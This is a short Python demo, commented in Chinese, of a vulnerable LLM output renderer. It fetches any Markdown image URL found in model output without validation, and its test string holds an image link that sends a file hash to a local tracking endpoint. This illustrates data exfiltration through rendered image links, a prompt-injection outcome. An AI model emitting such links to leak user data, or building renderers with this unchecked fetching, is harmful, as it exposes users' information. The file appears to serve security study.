import re
import requests

def render_content_stream(content):
    """
    模拟 Output Renderer 组件。
    它负责接收 LLM 的输出流，并实时渲染 Markdown。
    这里的漏洞在于：它没有验证图片 URL 的目标地址，直接发起请求。
    """
    print("\n[Output Renderer] 接收到模型响应流...")
    print(f"[Output Renderer] 渲染内容预览:\n---\n{content}\n---")
    
    # 简单的 Markdown 图片提取正则
    img_pattern = re.compile(r'!\[.*?\]\((.*?)\)')
    urls = img_pattern.findall(content)
    
    for url in urls:
        print(f"[Output Renderer] 检测到资源链接，正在加载: {url}")
        try:
            # 模拟浏览器/IDE 发起未授权的 GET 请求
            # 这是 "Unauthorized Web Request" 的核心
            resp = requests.get(url, timeout=2)
            print(f"[Output Renderer] 资源加载完成 (状态码: {resp.status_code})")
        except Exception as e:
            print(f"[Output Renderer] 资源加载失败: {e}")

if __name__ == "__main__":
    test_content = "Here is your file summary: ![preview](http://localhost:8081/track?file_hash=abc)"
    render_content_stream(test_content)
